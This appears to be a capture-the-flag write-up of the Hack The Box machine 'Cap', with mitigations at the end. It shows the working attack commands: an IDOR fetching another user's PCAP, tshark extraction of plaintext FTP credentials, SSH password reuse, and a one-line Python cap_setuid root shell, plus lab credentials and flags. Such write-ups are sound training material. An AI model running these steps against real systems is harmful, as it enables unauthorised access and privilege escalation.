```
  ██████╗ █████╗ ██████╗
 ██╔════╝██╔══██╗██╔══██╗
 ██║     ███████║██████╔╝
 ██║     ██╔══██║██╔═══╝
 ╚██████╗██║  ██║██║
  ╚═════╝╚═╝  ╚═╝╚═╝
              Hack The Box — Cap
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-10-15 | 🏠 **Platform:** Hack The Box | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~9 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan — FTP (21), SSH (22), HTTP (80/Gunicorn)
- [x] FTP anonymous login — denied
- [x] Web recon — Security Dashboard running on Gunicorn; feroxbuster found `/ip`, `/netstat`, `/data`, `/capture`
- [x] Identified IDOR: `/data/2` → own scan; `/data/0` → older scan with plaintext FTP creds in PCAP
- [x] Downloaded PCAP `0.pcap` via browser (`/data/0` redirects to `/download/0`)
- [x] Extracted FTP credentials with tshark: `nathan:Buck3tH4TF0RM3!`
- [x] FTP login as `nathan` → retrieved `user.txt`
- [x] SSH login as `nathan` with same password → interactive shell
- [x] Enumerated capabilities: `python3.8` has `cap_setuid,cap_net_bind_service+eip`
- [x] Exploited `cap_setuid` on python3.8 → `os.setuid(0)` → root shell
- [x] Retrieved `root.txt` from `/root`

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap — port scanning and service detection
- 🌐 Feroxbuster — web content discovery
- 🦈 tshark / Wireshark — PCAP analysis; FTP credential extraction
- 🔐 FTP client — credential confirmation and flag retrieval
- 🐚 SSH — authenticated shell as nathan
- 🐍 Python3 capabilities abuse — `cap_setuid` privilege escalation

---

## ⚡ TL;DR

The web app ran a "Security Dashboard" that let users trigger network captures. The capture results were stored at `/data/<id>` with no access controls — navigating to `/data/0` returned a PCAP from someone else's session. That PCAP captured an FTP session with plaintext credentials (`nathan:Buck3tH4TF0RM3!`). The same password worked for SSH. On the box, `python3.8` had the `cap_setuid` Linux capability set, which lets any process call `setuid(0)` — two lines of Python later: root.

---

## 📖 Introduction

**Cap** is an HTB Easy box with a deceptively clean attack chain. The entire compromise hinges on two concepts that frequently appear in real engagements: an IDOR (Insecure Direct Object Reference) on a web dashboard exposing other users' data, and Linux capabilities misuse as a privilege escalation vector. Capabilities are often overlooked in favour of SUID hunting, but `cap_setuid` is arguably more dangerous than most SUID binaries because it lets a binary call `setuid(0)` without being root itself.

### Prerequisites

Readers should know:
- What an IDOR vulnerability is and how to test for it manually
- What PCAP files are and basic tshark/Wireshark usage for protocol filtering
- What Linux capabilities are and how they differ from SUID bits
- Why `cap_setuid` is dangerous (it bypasses the normal `setuid(0)` restriction that requires root privileges)

---

## 🔍 Recon

*(~0 mins)*

### Port Scan

```bash
rustscan -a 10.129.171.136 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC
```

| Port | Service | Version / Detail |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80/tcp | HTTP | Gunicorn — "Security Dashboard" |

Three services. FTP and SSH both require credentials; the web app is the starting point.

### FTP Anonymous — Denied

```bash
ftp 10.129.171.136
Name: anonymous
530 Login incorrect.
```

No anonymous access. Moving to the web app.

### Web Recon

The web app is a Python/Gunicorn "Security Dashboard" with three main features accessible from the navbar: **Dashboard** (general stats), **IP Config** (`/ip`), and **Network Status** (`/netstat`). A "Security Snapshot" button triggers a network capture and redirects to `/data/<id>`.

Feroxbuster found the routes cleanly:

```bash
feroxbuster -u http://10.129.171.136 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,html,txt,bak,js,json -s 200,204,301,302,307,401,403,405 -k --no-state
```

Notable finds:

| URL | Notes |
| --- | --- |
| `/ip` | Runs `ifconfig`, renders output |
| `/netstat` | Runs `netstat`, renders output |
| `/capture` | Redirects to `/data/1` (current capture) |
| `/data` | Redirects to `/` — no listing |

The `/capture` → `/data/1` redirect is the first hint: the ID is user-controlled.

---

## 🚪 Foothold

*(~15 mins)*

### IDOR on /data/<id>

Browsing to `/data/1` returns my own scan result. Browsing to `/data/2`, `/data/3` — same. Trying `/data/0`:

```
http://10.129.171.136/data/0
```

The app returns a download link for `0.pcap` — a PCAP file generated before my session began. There is no session check, no ownership validation; the only "access control" is guessing the right integer. This is a textbook IDOR.

### PCAP Analysis — FTP Credentials in Plaintext

```bash
PCAP="0.pcap"
capinfos "$PCAP"
```

```
Number of packets:   4,607
File size:           950 kB
Capture duration:    4.776751 seconds
```

Checking protocol hierarchy:

```bash
tshark -r "$PCAP" -q -z io,phs
```

```
tcp                    frames:4607
  http                 frames:2289
    data-text-lines    frames:1144
```

Pure TCP/HTTP — and `data-text-lines` means unencrypted content. Filtering for FTP auth commands directly:

```bash
tshark -r 0.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"'
```

```
36  4.126500  192.168.196.1 → 192.168.196.16  FTP  Request: USER nathan
40  5.424998  192.168.196.1 → 192.168.196.16  FTP  Request: PASS Buck3tH4TF0RM3!
```

Credentials in plaintext, as God and vsftpd intended.

**Credentials found:**

| Username | Password | Service |
| --- | --- | --- |
| `nathan` | `Buck3tH4TF0RM3!` | FTP (and SSH — password reuse) |

### FTP Login — User Flag

```bash
ftp 10.129.171.136
Name: nathan
Password: Buck3tH4TF0RM3!
230 Login successful.
```

```
ftp> dir
-r--------    1 1001     1001           33 Oct 15 13:38 user.txt
ftp> get user.txt
```

```bash
cat user.txt
9ef7730201688d94b3b0d7bad7e25fc4
```

---

## 🐚 Shell / Access

*(~20 mins)*

### SSH as nathan

FTP gave the user flag, but an interactive shell is needed for escalation. Password reuse check:

```bash
ssh nathan@10.129.171.136
# password: Buck3tH4TF0RM3!
```

```
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

No password reuse shame here — it's an HTB box. But in production this would be two findings on the report.

### Enumeration

```bash
nathan@cap:~$ sudo -l
Sorry, user nathan may not run sudo on cap.

nathan@cap:~$ cat /etc/crontab
# [only standard system cron jobs — nothing useful]
```

No sudo. Crontab clean. Checking Linux capabilities specifically (often skipped in favour of SUID):

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

There it is: `/usr/bin/python3.8` has **`cap_setuid`**.

---

## 📈 Escalation

*(~22 mins)*

### cap_setuid on python3.8

**What is cap_setuid?** Linux capabilities are a fine-grained split of the traditional root privilege set. Normally, only a process running as root (UID 0) can call `setuid(0)`. The `cap_setuid` capability overrides this restriction — it allows the process to call `setuid()` with any UID regardless of its current UID. A binary with `cap_setuid` effective (`+e`) can therefore change its UID to 0 and spawn a shell as root without any password or SUID bit required.

Confirming the effective bit is set:

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; print(os.getuid(), os.geteuid())'
1001 1001
```

Both UID and EUID show 1001 — normal. But the capability lets `setuid(0)` succeed:

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

UID is now 0. Root shell.

```bash
root@cap:/root# cat root.txt
01beb0effac8620d8cb43840b2f7a25e
```

---

## 💥 Exploitation

The complete attack chain:

1. **Web IDOR** — `/data/0` accessible without ownership check → downloaded PCAP from another user's session
2. **PCAP analysis** — tshark FTP auth filter → `nathan:Buck3tH4TF0RM3!` in plaintext
3. **FTP login** → user flag
4. **SSH login** (password reuse) → interactive shell as `nathan`
5. **`cap_setuid` on python3.8** → `os.setuid(0)` → root shell → root flag

---

## 🐇 Rabbit Holes

### FTP Anonymous — Hard No

The notes show an immediate anonymous FTP attempt at the start. vsftpd 3.0.3 with anonymous login disabled returns `530 Login incorrect` before you can do anything. Nothing to investigate there, no version-specific vulnerability to chase — it's just locked. The PCAP was always the path.

### feroxbuster on the PCAP — Noise, Not Signal

The PCAP captured by `/data/1` (my own scan) contained feroxbuster's scan traffic — around 4,600 frames of my own HTTP requests. Trying to extract meaningful credentials from that was a waste of time. The content was all 404 responses to wordlist entries. The insight is that the `/data/0` PCAP predates my scan and captured someone else's activity — the IDOR is what made it reachable, not web dir brute.

### SUID pkexec / PwnKit Temptation

`/usr/bin/pkexec` shows up in the SUID list, and this is Ubuntu 20.04 (kernel 5.4.0-80) — which is within CVE-2021-4034 (PwnKit) range. On a previous box (Red), PwnKit was the intended path. Here it's a distraction: `cap_setuid` on python3.8 is two lines and zero compilation. Always enumerate capabilities before reaching for CVEs.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `9ef7730201688d94b3b0d7bad7e25fc4` | `~/user.txt` (FTP + SSH) |
| Root | `01beb0effac8620d8cb43840b2f7a25e` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| IDOR on `/data/<id>` — no session-based ownership check | High | Validate that the requesting session owns the requested capture ID; use UUIDs instead of sequential integers to prevent enumeration |
| FTP credentials captured in cleartext PCAP, accessible to other users | Critical | Never run FTP on production infrastructure; FTP transmits credentials in plaintext by design — use SFTP or FTPS; store captures only accessible to the owning session |
| Password reuse across FTP and SSH | High | Enforce distinct credentials per service; consider SSH key-only authentication and disable password auth entirely |
| `cap_setuid` assigned to a general-purpose interpreter (`python3.8`) | Critical | Never assign `cap_setuid` to scripting interpreters; capabilities on interpreters are functionally equivalent to running those interpreters as root — use a purpose-built binary if a service genuinely requires UID switching |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Linux capabilities are quieter than SUID bits and just as dangerous. `cap_setuid` on an interpreter is essentially a global privilege escalation token for anyone who can run that interpreter. `getcap -r / 2>/dev/null` should be in every Linux privilege escalation checklist, ideally before SUID enumeration — it's a shorter list and the hits are often more reliable.

---

## 🔁 If I Did It Again

Go straight to `/data/0` by hand before running any automated scan — sequential integer IDs on a capture endpoint is an obvious IDOR test case. The PCAP analysis itself is a single tshark one-liner once the file is in hand. On the escalation side, run `getcap` before `find -perm -4000`; capabilities lists are shorter and more targeted than the pages of SUID output snap packages generate.

---

## 🔚 Changelog

*Last updated: 2026-10-15*

---

[↑ Back to top](#)
